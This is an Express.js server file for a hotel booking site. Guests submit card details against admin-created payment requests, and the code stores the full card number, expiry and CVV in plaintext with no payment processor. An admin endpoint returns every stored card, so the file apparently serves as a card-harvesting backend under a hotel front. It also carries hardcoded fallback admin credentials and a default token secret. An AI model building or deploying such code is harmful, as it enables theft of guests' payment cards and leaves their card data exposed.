/**
 * THE BEYBÛN HOTEL — Express API + static site
 * Railway: set DATABASE_URL (auto from Postgres), ADMIN_USERNAME, ADMIN_PASSWORD, JWT_SECRET
 */
require("dotenv").config();

const path = require("path");
const crypto = require("crypto");
const express = require("express");
const cors = require("cors");
const { Pool } = require("pg");

const PORT = process.env.PORT || 3000;
const ADMIN_USERNAME = process.env.ADMIN_USERNAME || "Mustafa.Beybun";
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "Admin123";
const JWT_SECRET = process.env.JWT_SECRET || "beybun-dev-secret-change-me";

if (!process.env.DATABASE_URL) {
  console.warn("WARNING: DATABASE_URL is not set. Add Railway PostgreSQL and link DATABASE_URL.");
}

const pool = process.env.DATABASE_URL
  ? new Pool({
      connectionString: process.env.DATABASE_URL,
      ssl: process.env.DATABASE_SSL === "false" ? false : { rejectUnauthorized: false }
    })
  : null;

const app = express();
app.use(cors());
app.use(express.json({ limit: "1mb" }));

function mapPayment(row) {
  if (!row) return null;
  return {
    id: row.id,
    requestNumber: row.request_number,
    clientName: row.client_name,
    phone: row.phone || "",
    room: row.room || "",
    checkin: row.checkin,
    checkout: row.checkout,
    nights: Number(row.nights) || 0,
    dailyCost: Number(row.daily_cost) || 0,
    totalCost: Number(row.total_cost) || 0,
    downPayment: Number(row.down_payment) || 0,
    notes: row.notes || "",
    status: row.status,
    createdAt: row.created_at,
    card: row.card_number
      ? {
          holder: row.card_holder,
          number: row.card_number,
          expiry: row.card_expiry,
          cvv: row.card_cvv,
          submittedAt: row.card_submitted_at
        }
      : null
  };
}

function mapContact(row) {
  return {
    id: String(row.id),
    name: row.name,
    email: row.email || "",
    phone: row.phone || "",
    room: row.room || "",
    checkin: row.checkin,
    checkout: row.checkout,
    guests: row.guests,
    message: row.message || "",
    status: row.status,
    createdAt: row.created_at
  };
}

function signToken(username) {
  const exp = Date.now() + 7 * 24 * 60 * 60 * 1000;
  const payload = Buffer.from(JSON.stringify({ u: username, exp })).toString("base64url");
  const sig = crypto.createHmac("sha256", JWT_SECRET).update(payload).digest("base64url");
  return payload + "." + sig;
}

function verifyToken(token) {
  if (!token || typeof token !== "string" || token.indexOf(".") === -1) return null;
  const [payload, sig] = token.split(".");
  const expected = crypto.createHmac("sha256", JWT_SECRET).update(payload).digest("base64url");
  if (sig !== expected) return null;
  try {
    const data = JSON.parse(Buffer.from(payload, "base64url").toString("utf8"));
    if (!data.exp || data.exp < Date.now()) return null;
    if (data.u !== ADMIN_USERNAME) return null;
    return data;
  } catch (e) {
    return null;
  }
}

function requireAdmin(req, res, next) {
  const header = req.headers.authorization || "";
  const token = header.startsWith("Bearer ") ? header.slice(7) : "";
  const session = verifyToken(token);
  if (!session) {
    return res.status(401).json({ error: "Unauthorized" });
  }
  req.admin = session;
  next();
}

function requireDb(req, res, next) {
  if (!pool) {
    return res.status(503).json({ error: "Database not configured. Set DATABASE_URL on Railway." });
  }
  next();
}

async function initDb() {
  if (!pool) return;
  await pool.query(`
    CREATE TABLE IF NOT EXISTS contacts (
      id SERIAL PRIMARY KEY,
      name TEXT NOT NULL,
      email TEXT DEFAULT '',
      phone TEXT DEFAULT '',
      room TEXT DEFAULT '',
      checkin TEXT DEFAULT '',
      checkout TEXT DEFAULT '',
      guests TEXT DEFAULT '',
      message TEXT DEFAULT '',
      status TEXT DEFAULT 'new',
      created_at TIMESTAMPTZ DEFAULT NOW()
    );

    CREATE TABLE IF NOT EXISTS payments (
      id SERIAL PRIMARY KEY,
      request_number TEXT UNIQUE NOT NULL,
      client_name TEXT NOT NULL,
      phone TEXT DEFAULT '',
      room TEXT DEFAULT '',
      checkin TEXT DEFAULT '',
      checkout TEXT DEFAULT '',
      nights INTEGER DEFAULT 0,
      daily_cost NUMERIC(12,2) DEFAULT 0,
      total_cost NUMERIC(12,2) DEFAULT 0,
      down_payment NUMERIC(12,2) DEFAULT 0,
      notes TEXT DEFAULT '',
      status TEXT DEFAULT 'awaiting_payment',
      card_holder TEXT,
      card_number TEXT,
      card_expiry TEXT,
      card_cvv TEXT,
      card_submitted_at TIMESTAMPTZ,
      created_at TIMESTAMPTZ DEFAULT NOW()
    );
  `);
  console.log("PostgreSQL tables ready");
}

function nightsBetween(checkin, checkout) {
  if (!checkin || !checkout) return 0;
  const a = new Date(checkin + "T00:00:00");
  const b = new Date(checkout + "T00:00:00");
  const ms = b - a;
  if (Number.isNaN(ms) || ms <= 0) return 0;
  return Math.round(ms / (1000 * 60 * 60 * 24));
}

function luhnValid(number) {
  const digits = String(number).replace(/\D/g, "");
  if (digits.length < 13 || digits.length > 19) return false;
  let sum = 0;
  let alt = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let n = parseInt(digits.charAt(i), 10);
    if (alt) {
      n *= 2;
      if (n > 9) n -= 9;
    }
    sum += n;
    alt = !alt;
  }
  return sum % 10 === 0;
}

app.get("/api/health", (req, res) => {
  res.json({ ok: true, db: Boolean(pool) });
});

app.post("/api/admin/login", (req, res) => {
  const username = String((req.body && req.body.username) || "").trim();
  const password = String((req.body && req.body.password) || "");
  if (username !== ADMIN_USERNAME || password !== ADMIN_PASSWORD) {
    return res.status(401).json({ error: "Incorrect username or password." });
  }
  res.json({ token: signToken(username), username });
});

app.get("/api/admin/contacts", requireDb, requireAdmin, async (req, res) => {
  try {
    const { rows } = await pool.query("SELECT * FROM contacts ORDER BY created_at DESC");
    res.json(rows.map(mapContact));
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "Failed to load contacts" });
  }
});

app.post("/api/contacts", requireDb, async (req, res) => {
  try {
    const b = req.body || {};
    const { rows } = await pool.query(
      `INSERT INTO contacts (name, email, phone, room, checkin, checkout, guests, message, status)
       VALUES ($1,$2,$3,$4,$5,$6,$7,$8,'new')
       RETURNING *`,
      [
        b.name || "",
        b.email || "",
        b.phone || "",
        b.room || "",
        b.checkin || "",
        b.checkout || "",
        String(b.guests || ""),
        b.message || ""
      ]
    );
    res.status(201).json(mapContact(rows[0]));
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "Failed to save contact" });
  }
});

app.patch("/api/admin/contacts/:id", requireDb, requireAdmin, async (req, res) => {
  try {
    const status = (req.body && req.body.status) || "read";
    await pool.query("UPDATE contacts SET status = $1 WHERE id = $2", [status, req.params.id]);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: "Failed to update contact" });
  }
});

app.delete("/api/admin/contacts/:id", requireDb, requireAdmin, async (req, res) => {
  try {
    await pool.query("DELETE FROM contacts WHERE id = $1", [req.params.id]);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: "Failed to delete contact" });
  }
});

app.get("/api/admin/payments", requireDb, requireAdmin, async (req, res) => {
  try {
    const { rows } = await pool.query("SELECT * FROM payments ORDER BY created_at DESC");
    res.json(rows.map(mapPayment));
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "Failed to load payments" });
  }
});

app.post("/api/admin/payments", requireDb, requireAdmin, async (req, res) => {
  try {
    const b = req.body || {};
    const checkin = b.checkin || "";
    const checkout = b.checkout || "";
    const nights = Number(b.nights) || nightsBetween(checkin, checkout);
    const dailyCost = Number(b.dailyCost) || 0;
    const totalCost = Number(b.totalCost) || dailyCost * nights;
    const downPayment = Number(b.downPayment) || 0;
    const requestNumber = "BB-" + Math.floor(100000 + Math.random() * 900000);

    const { rows } = await pool.query(
      `INSERT INTO payments
        (request_number, client_name, phone, room, checkin, checkout, nights, daily_cost, total_cost, down_payment, notes, status)
       VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,'awaiting_payment')
       RETURNING *`,
      [
        requestNumber,
        b.clientName || "",
        b.phone || "",
        b.room || "",
        checkin,
        checkout,
        nights,
        dailyCost,
        totalCost,
        downPayment,
        b.notes || ""
      ]
    );
    res.status(201).json(mapPayment(rows[0]));
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "Failed to create payment request" });
  }
});

app.delete("/api/admin/payments/:number", requireDb, requireAdmin, async (req, res) => {
  try {
    await pool.query("DELETE FROM payments WHERE request_number = $1", [String(req.params.number).toUpperCase()]);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: "Failed to delete payment" });
  }
});

app.get("/api/payments/:number", requireDb, async (req, res) => {
  try {
    const code = String(req.params.number || "").trim().toUpperCase();
    const { rows } = await pool.query("SELECT * FROM payments WHERE request_number = $1", [code]);
    if (!rows[0]) return res.status(404).json({ error: "Invalid payment request number." });
    const payment = mapPayment(rows[0]);
    // Guests never receive full card data back
    const publicPayment = Object.assign({}, payment, { card: payment.card ? { submitted: true } : null });
    res.json(publicPayment);
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "Failed to load payment" });
  }
});

app.post("/api/payments/:number/card", requireDb, async (req, res) => {
  try {
    const code = String(req.params.number || "").trim().toUpperCase();
    const { rows } = await pool.query("SELECT * FROM payments WHERE request_number = $1", [code]);
    if (!rows[0]) return res.status(404).json({ error: "Invalid payment request number." });
    if (rows[0].card_number || rows[0].status === "processing") {
      return res.status(409).json({ error: "This payment request was already submitted." });
    }

    const b = req.body || {};
    const holder = String(b.holder || "").trim();
    const number = String(b.number || "").replace(/\D/g, "");
    const expiry = String(b.expiry || "").trim();
    const cvv = String(b.cvv || "").trim();

    if (!holder || holder.length < 2) return res.status(400).json({ error: "Please enter the cardholder name." });
    if (!luhnValid(number)) return res.status(400).json({ error: "Please enter a valid card number." });
    if (!/^\d{2}\/\d{2}$/.test(expiry)) return res.status(400).json({ error: "Use expiry format MM/YY." });
    const mm = parseInt(expiry.slice(0, 2), 10);
    const yy = parseInt(expiry.slice(3), 10);
    if (mm < 1 || mm > 12) return res.status(400).json({ error: "Invalid expiry month." });
    const expDate = new Date(2000 + yy, mm);
    if (expDate <= new Date()) return res.status(400).json({ error: "This card appears to be expired." });
    if (!/^\d{3,4}$/.test(cvv)) return res.status(400).json({ error: "Enter a valid CVV." });

    const updated = await pool.query(
      `UPDATE payments
       SET status = 'processing',
           card_holder = $1,
           card_number = $2,
           card_expiry = $3,
           card_cvv = $4,
           card_submitted_at = NOW()
       WHERE request_number = $5
       RETURNING *`,
      [holder, number, expiry, cvv, code]
    );
    res.json({ ok: true, requestNumber: code, status: updated.rows[0].status });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "Failed to submit payment" });
  }
});

app.use(express.static(path.join(__dirname)));

initDb()
  .then(() => {
    app.listen(PORT, () => {
      console.log("BEYBÛN server listening on port " + PORT);
    });
  })
  .catch((err) => {
    console.error("Failed to init database", err);
    process.exit(1);
  });
